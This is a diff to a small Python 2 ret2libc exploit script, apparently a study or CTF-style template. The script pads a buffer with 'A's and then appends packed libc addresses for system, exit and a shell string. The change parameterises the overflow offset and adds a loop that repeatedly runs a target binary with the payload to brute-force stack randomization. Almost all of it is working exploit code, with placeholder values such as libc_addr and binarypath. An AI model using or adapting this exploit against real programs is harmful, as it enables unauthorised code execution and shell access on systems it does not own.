@@ -1,4 +1,5 @@
 import struct
+from subprocess import call
 
 #ldd bin | grep libc
 libc_base = libc_addr
@@ -24,9 +25,13 @@ shell=struct.pack("<I", libc_base + shell_offset)
   # generate_pattern
   # debug with the patern
   # offset_pattern with the address
-buf = 'A' * 112
+buf = 'A' * offset
 buf += system
 buf += exit
 buf += shell
 
-print buf
+#x should be calculated with the stack randomization
+while i < x:
+    i+=1
+    print "Try: %s" % i
+    call(["binarypath", buf])
